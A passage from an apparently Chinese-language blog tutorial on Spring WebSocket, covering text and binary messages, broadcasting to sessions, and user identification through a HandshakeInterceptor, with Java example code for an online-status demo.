<li><p><strong>用途</strong>：用于传输纯文本数据，最常见的如 <strong>JSON</strong>、XML、或者简单的字符串命令。</p>
</li>
<li><p><strong>构造</strong>：<code>new TextMessage(&quot;your string payload&quot;)</code>。</p>
</li>
<li><p><strong>获取内容</strong>：<code>getPayload()</code> 方法返回一个 <code>String</code>。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发送JSON字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;type\&quot;:\&quot;chat\&quot;, \&quot;content\&quot;:\&quot;Hello, world!\&quot;&#125;&quot;</span>;</span><br><span class="line">session.sendMessage(<span class="keyword">new</span> <span class="title class_">TextMessage</span>(json));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 handleTextMessage 方法中接收</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleTextMessage</span><span class="params">(WebSocketSession session, TextMessage message)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> message.getPayload(); <span class="comment">// payload 是 &quot;&#123;\&quot;type\&quot;:\&quot;chat\&quot;, ...&#125;&quot;</span></span><br><span class="line">    <span class="comment">// 后续通常会用 Jackson 或 Gson 等库将 payload 解析为 Java 对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong><code>BinaryMessage</code></strong>:</p>
<ul>
<li><p><strong>用途</strong>：用于传输非文本数据，如图片、音频、视频流、文件，或者经过 Protobuf&#x2F;Thrift 等序列化框架编码后的二进制数据。</p>
</li>
<li><p><strong>构造</strong>：<code>new BinaryMessage(byte[] payload)</code> 或 <code>new BinaryMessage(ByteBuffer payload)</code>。</p>
</li>
<li><p><strong>获取内容</strong>：<code>getPayload()</code> 方法返回一个 <code>ByteBuffer</code>。你可以通过 <code>byteBuffer.array()</code> 转换为 <code>byte[]</code>。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发送一张图片的字节数据</span></span><br><span class="line"><span class="type">byte</span>[] imageBytes = readImageFromFile(<span class="string">&quot;path/to/image.jpg&quot;</span>);</span><br><span class="line">session.sendMessage(<span class="keyword">new</span> <span class="title class_">BinaryMessage</span>(imageBytes));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 handleBinaryMessage 方法中接收</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleBinaryMessage</span><span class="params">(WebSocketSession session, BinaryMessage message)</span> &#123;</span><br><span class="line">    <span class="type">ByteBuffer</span> <span class="variable">payload</span> <span class="operator">=</span> message.getPayload();</span><br><span class="line">    <span class="type">byte</span>[] binaryData = <span class="keyword">new</span> <span class="title class_">byte</span>[payload.remaining()];</span><br><span class="line">    payload.get(binaryData);</span><br><span class="line">    <span class="comment">// 后续可以处理这些二进制数据，如存为文件、显示图片等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>补充：消息分片（Message Fragmentation）</strong></p>
<p>对于非常大的消息，WebSocket 允许将其分割成多个帧进行传输。</p>
<ul>
<li><code>WebSocketMessage</code> 有一个 <code>isLast()</code> 方法，<code>true</code> 表示这是消息的最后一个分片。</li>
<li>在 <code>AbstractWebSocketHandler</code> 中，默认行为是<strong>缓冲所有分片</strong>，直到接收完最后一个分片，然后将它们合并成一个完整的 <code>TextMessage</code> 或 <code>BinaryMessage</code>，再调用 <code>handleTextMessage</code> 或 <code>handleBinaryMessage</code>。</li>
<li>这意味着在大多数情况下，你无需关心消息分片问题，Spring 已经为你处理好了。如果需要处理流式大数据，可以重写 <code>supportsPartialMessages()</code> 返回 <code>true</code>，并实现 <code>handleMessage()</code> 来处理每一个分片。但这属于高级用法。</li>
</ul>
<hr>
<h2 id="3-实践技巧"><a href="#3-实践技巧" class="headerlink" title="3. 实践技巧"></a>3. 实践技巧</h2><h4 id="3-1-管理所有-WebSocketSession-实现广播功能"><a href="#3-1-管理所有-WebSocketSession-实现广播功能" class="headerlink" title="3.1 管理所有 WebSocketSession 实现广播功能"></a>3.1 管理所有 <code>WebSocketSession</code> 实现广播功能</h4><p>广播（Broadcast）是指向所有当前连接的客户端发送同一条消息。这是许多实时应用的常见需求，例如系统公告、在线用户列表更新等。</p>
<p>要实现广播，服务器端必须持有一个所有活动 <code>WebSocketSession</code> 的引用集合。</p>
<p><strong>实现步骤：</strong></p>
<ol>
<li><strong>选择一个线程安全的集合</strong>：<br>由于 WebSocket 的连接和断开是并发操作（可能多个用户同时连接或断开），用于存储 <code>WebSocketSession</code> 的集合<strong>必须是线程安全的</strong>。<ul>
<li><strong><code>CopyOnWriteArraySet&lt;WebSocketSession&gt;</code></strong>：<strong>强烈推荐用于广播场景</strong>。它是一个线程安全的 <code>Set</code>。其特点是“写入时复制”，读操作（迭代）非常快且不需要加锁，非常适合“读多写少”的场景。广播就是典型的读多场景，而连接&#x2F;断开（写操作）相对较少。</li>
<li><code>ConcurrentHashMap&lt;String, WebSocketSession&gt;</code>：当你不仅需要广播，还需要根据特定标识（如用户ID）快速查找并向单个用户发送消息时，这是更好的选择。键（<code>String</code>）可以是 <code>session.getId()</code> 或更业务化的用户ID。</li>
</ul>
</li>
<li><strong>在 <code>WebSocketHandler</code> 中维护该集合</strong>：<br>在你的 <code>WebSocketHandler</code> 实现类中，声明这个线程安全的集合作为成员变量。</li>
<li><strong>在连接生命周期方法中更新集合</strong>：<ul>
<li>在 <code>afterConnectionEstablished()</code> 方法中，将新建立的 <code>WebSocketSession</code> 添加到集合中。</li>
<li>在 <code>afterConnectionClosed()</code> 方法中，将已关闭的 <code>WebSocketSession</code> 从集合中移除，以防内存泄漏和向无效连接发送消息。</li>
</ul>
</li>
<li><strong>实现广播方法</strong>：<br>遍历集合，对每一个 <code>WebSocketSession</code> 调用 <code>sendMessage()</code> 方法。</li>
</ol>
<p><strong>代码示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBroadcastHandler</span> <span class="keyword">extends</span> <span class="title class_">TextWebSocketHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 使用 CopyOnWriteArraySet 存储所有 session，保证线程安全</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> CopyOnWriteArraySet&lt;WebSocketSession&gt; sessions = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArraySet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionEstablished</span><span class="params">(WebSocketSession session)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 2. 连接建立后，将 session 添加到集合中</span></span><br><span class="line">        sessions.add(session);</span><br><span class="line">        System.out.println(<span class="string">&quot;新连接加入! 当前在线人数: &quot;</span> + sessions.size());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// (可选) 可以向新连接发送一条欢迎消息或当前状态</span></span><br><span class="line">        session.sendMessage(<span class="keyword">new</span> <span class="title class_">TextMessage</span>(<span class="string">&quot;欢迎连接到广播服务！&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleTextMessage</span><span class="params">(WebSocketSession session, TextMessage message)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 当一个客户端发送消息时，我们将其广播给所有客户端</span></span><br><span class="line">        System.out.println(<span class="string">&quot;收到消息: &quot;</span> + message.getPayload());</span><br><span class="line">        broadcast(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionClosed</span><span class="params">(WebSocketSession session, CloseStatus status)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 3. 连接关闭后，将 session 从集合中移除</span></span><br><span class="line">        sessions.remove(session);</span><br><span class="line">        System.out.println(<span class="string">&quot;一个连接关闭! 当前在线人数: &quot;</span> + sessions.size());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleTransportError</span><span class="params">(WebSocketSession session, Throwable exception)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 传输发生错误时，也需要从集合中移除 session</span></span><br><span class="line">        System.err.println(<span class="string">&quot;连接出现错误: &quot;</span> + exception.getMessage());</span><br><span class="line">        sessions.remove(session);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 4. 实现广播消息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> message 要发送的消息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">broadcast</span><span class="params">(TextMessage message)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (WebSocketSession session : sessions) &#123;</span><br><span class="line">            <span class="comment">// 检查 session 是否还打开</span></span><br><span class="line">            <span class="keyword">if</span> (session.isOpen()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 发送消息</span></span><br><span class="line">                    session.sendMessage(message);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="comment">// 记录错误，通常这里不需要做特别处理，因为 afterConnectionClosed 会处理会话移除</span></span><br><span class="line">                    System.err.println(<span class="string">&quot;广播消息失败: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-2-结合-HandshakeInterceptor-和-WebSocketSession-实现用户身份识别"><a href="#3-2-结合-HandshakeInterceptor-和-WebSocketSession-实现用户身份识别" class="headerlink" title="3.2 结合 HandshakeInterceptor 和 WebSocketSession 实现用户身份识别"></a>3.2 结合 <code>HandshakeInterceptor</code> 和 <code>WebSocketSession</code> 实现用户身份识别</h4><p>匿名连接在很多场景下是无用的。我们通常需要知道每个 <code>WebSocketSession</code> 对应的是哪个用户。这个身份识别的过程完美地体现了 <code>HandshakeInterceptor</code> 和 <code>WebSocketSession</code> 的协同工作。</p>
<p><strong>实现步骤：</strong></p>
<ol>
<li><strong>客户端在握手时提供身份信息</strong>：<ul>
<li><strong>对于有状态Web应用</strong>：通常浏览器在发起 WebSocket 连接请求时会自动带上 <code>Cookie</code>，其中包含了 <code>JSESSIONID</code>。</li>
<li><strong>对于无状态&#x2F;前后端分离应用</strong>：客户端通常会在 URL 查询参数 (<code>ws://.../?token=xxx</code>) 或 HTTP Header (<code>Authorization: Bearer xxx</code>) 中携带认证凭证（如 JWT）。</li>
</ul>
</li>
<li><strong>创建 <code>HandshakeInterceptor</code> 进行身份验证</strong>：<ul>
<li>实现 <code>HandshakeInterceptor</code> 接口，重点是 <code>beforeHandshake</code> 方法。</li>
<li>在 <code>beforeHandshake</code> 中，从 <code>ServerHttpRequest</code> 中获取身份信息。</li>
<li>验证身份。如果验证失败，返回 <code>false</code> 拒绝连接。</li>
<li>如果验证成功，将用户的唯一标识（如用户ID）存入 <code>attributes</code> 这个 <code>Map</code> 中。</li>
</ul>
</li>
<li><strong>在 <code>WebSocketHandler</code> 中获取并使用用户身份</strong>：<ul>
<li>在 <code>afterConnectionEstablished</code> 或其他处理器方法中，通过 <code>session.getAttributes().get(&quot;yourKey&quot;)</code> 来获取之前存入的用户ID。</li>
<li>利用这个ID，你可以实现更复杂的逻辑，例如：<ul>
<li>维护一个 <code>ConcurrentHashMap&lt;String, WebSocketSession&gt;</code> 来实现<strong>向指定用户发送消息</strong>。</li>
<li>记录用户行为日志。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>代码示例：</strong></p>
<p><strong>第一步：创建握手拦截器 <code>AuthHandshakeInterceptor</code></strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthHandshakeInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandshakeInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">beforeHandshake</span><span class="params">(ServerHttpRequest request, ServerHttpResponse response,</span></span><br><span class="line"><span class="params">                                   WebSocketHandler wsHandler, Map&lt;String, Object&gt; attributes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 场景：从 HttpSession 中获取登录用户ID</span></span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> ServletServerHttpRequest) &#123;</span><br><span class="line">            <span class="type">ServletServerHttpRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> (ServletServerHttpRequest) request;</span><br><span class="line">            <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> servletRequest.getServletRequest().getSession(<span class="literal">false</span>); <span class="comment">// false:不创建新session</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (session != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 假设登录后，用户ID被存储在HttpSession的 &quot;userId&quot; 属性中</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> (String) session.getAttribute(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (userId != <span class="literal">null</span> &amp;&amp; !userId.isEmpty()) &#123;</span><br><span class="line">                    <span class="comment">// 验证通过，将 userId 放入 WebSocketSession 的 attributes 中</span></span><br><span class="line">                    attributes.put(<span class="string">&quot;userId&quot;</span>, userId);</span><br><span class="line">                    System.out.println(<span class="string">&quot;握手成功，用户ID: &quot;</span> + userId);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 允许握手</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果是JWT，则可以这样获取:</span></span><br><span class="line">        <span class="comment">// String token = request.getHeaders().getFirst(&quot;Authorization&quot;);</span></span><br><span class="line">        <span class="comment">// if (jwtUtil.validate(token)) &#123;</span></span><br><span class="line">        <span class="comment">//     String userId = jwtUtil.getUserIdFrom(token);</span></span><br><span class="line">        <span class="comment">//     attributes.put(&quot;userId&quot;, userId);</span></span><br><span class="line">        <span class="comment">//     return true;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;握手失败，用户未认证！&quot;</span>);</span><br><span class="line">        <span class="comment">// 验证失败，拒绝握手</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterHandshake</span><span class="params">(ServerHttpRequest request, ServerHttpResponse response,</span></span><br><span class="line"><span class="params">                               WebSocketHandler wsHandler, Exception exception)</span> &#123;</span><br><span class="line">        <span class="comment">// 握手后的操作，无论成功失败都会执行，可用于记录日志</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第二步：在 <code>WebSocketConfig</code> 中注册拦截器</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSocket</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title class_">WebSocketConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerWebSocketHandlers</span><span class="params">(WebSocketHandlerRegistry registry)</span> &#123;</span><br><span class="line">        registry.addHandler(myBroadcastHandler(), <span class="string">&quot;/broadcast&quot;</span>)</span><br><span class="line">                .addInterceptors(<span class="keyword">new</span> <span class="title class_">AuthHandshakeInterceptor</span>()) <span class="comment">// &lt;-- 在这里添加拦截器</span></span><br><span class="line">                .setAllowedOrigins(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MyBroadcastHandler <span class="title function_">myBroadcastHandler</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyBroadcastHandler</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第三步：在 <code>WebSocketHandler</code> 中使用身份信息</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionEstablished</span><span class="params">(WebSocketSession session)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 从 session 的 attributes 中获取握手时存入的用户ID</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> (String) session.getAttributes().get(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (userId != <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;用户 &quot;</span> + userId + <span class="string">&quot; 连接成功！&quot;</span>);</span><br><span class="line">        <span class="comment">// 此时，你可以将 userId 和 session 的关系存储起来，用于后续的单点消息发送</span></span><br><span class="line">        <span class="comment">// userSessionMap.put(userId, session);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 其他逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="4-示例代码-1"><a href="#4-示例代码-1" class="headerlink" title="4. 示例代码"></a>4. 示例代码</h2><p><strong>业务目标：</strong></p>
<ol>
<li>当一个新用户连接时，所有已在线的用户都会收到通知，告知新用户加入了，并更新自己的在线用户列表。</li>
<li>当一个用户断开连接时，所有剩余的在线用户都会收到通知，告知该用户已离开，并更新自己的在线用户列表。</li>
<li>客户端通过 WebSocket URL 的查询参数传递自己的用户名，例如 <code>ws://localhost:8080/status?username=Alice</code>。</li>
<li>服务器拒绝重名用户的连接。</li>
</ol>
<p>这个示例将完美地演示 <code>HandshakeInterceptor</code>（用于身份识别和验证）和 <code>WebSocketHandler</code>（用于会话管理和广播）的协同工作。</p>
<hr>
<h3 id="4-1-项目设置-pom-xml"><a href="#4-1-项目设置-pom-xml" class="headerlink" title="4.1 项目设置 (pom.xml)"></a>4.1 项目设置 (pom.xml)</h3><p>确保你的 Spring Boot 项目中包含了 WebSocket 的启动器。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ... 其他依赖 ... --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-2-创建握手拦截器-UserStatusHandshakeInterceptor"><a href="#4-2-创建握手拦截器-UserStatusHandshakeInterceptor" class="headerlink" title="4.2 创建握手拦截器 (UserStatusHandshakeInterceptor)"></a>4.2 创建握手拦截器 (<code>UserStatusHandshakeInterceptor</code>)</h3><p>这个拦截器的职责是：</p>
<ol>
<li>从连接请求的 URI 中解析出 <code>username</code>。</li>
<li>验证 <code>username</code> 是否存在且不重复。</li>
<li>如果验证通过，将 <code>username</code> 存入 <code>attributes</code>，以便后续的 <code>WebSocketHandler</code> 使用。</li>
<li>如果验证失败，中断握手。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserStatusHandshakeInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandshakeInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">beforeHandshake</span><span class="params">(ServerHttpRequest request, ServerHttpResponse response,</span></span><br><span class="line"><span class="params">                                   WebSocketHandler wsHandler, Map&lt;String, Object&gt; attributes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 从 URI 中解析出 username</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> UriComponentsBuilder.fromUri(request.getURI())</span><br><span class="line">                .build()</span><br><span class="line">                .getQueryParams()</span><br><span class="line">                .getFirst(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 验证 username 是否为空</span></span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.hasText(username)) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;握手失败：username 参数为空&quot;</span>);</span><br><span class="line">            response.setStatusCode(HttpStatus.BAD_REQUEST); <span class="comment">// 400 Bad Request</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 验证 username 是否已在线 (简单起见，我们直接访问 Handler 里的静态 Map)</span></span><br><span class="line">        <span class="keyword">if</span> (OnlineStatusHandler.isUserOnline(username)) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;握手失败：用户 &#x27;&quot;</span> + username + <span class="string">&quot;&#x27; 已在线&quot;</span>);</span><br><span class="line">            response.setStatusCode(HttpStatus.CONFLICT); <span class="comment">// 409 Conflict</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 将 username 存入 attributes，传递给 WebSocketHandler</span></span><br><span class="line">        attributes.put(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">        System.out.println(<span class="string">&quot;握手成功，用户: &quot;</span> + username);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterHandshake</span><span class="params">(ServerHttpRequest request, ServerHttpResponse response,</span></span><br><span class="line"><span class="params">                               WebSocketHandler wsHandler, Exception exception)</span> &#123;</span><br><span class="line">        <span class="comment">// 无需实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-3-创建-WebSocket-处理器-OnlineStatusHandler"><a href="#4-3-创建-WebSocket-处理器-OnlineStatusHandler" class="headerlink" title="4.3 创建 WebSocket 处理器 (OnlineStatusHandler)"></a>4.3 创建 WebSocket 处理器 (<code>OnlineStatusHandler</code>)</h3><p>这个处理器的职责是：</p>
<ol>
<li>管理所有在线用户的 <code>WebSocketSession</code>。我们使用 <code>ConcurrentHashMap&lt;String, WebSocketSession&gt;</code> 来存储用户名到会话的映射。</li>
<li>在 <code>afterConnectionEstablished</code> 中，将新用户加入 Map，并广播“用户加入”的消息。</li>
<li>在 <code>afterConnectionClosed</code> 中，将用户从 Map 中移除，并广播“用户离开”的消息。</li>
<li>提供一个 <code>broadcastStatusUpdate</code> 方法来统一处理广播逻辑。</li>
</ol>
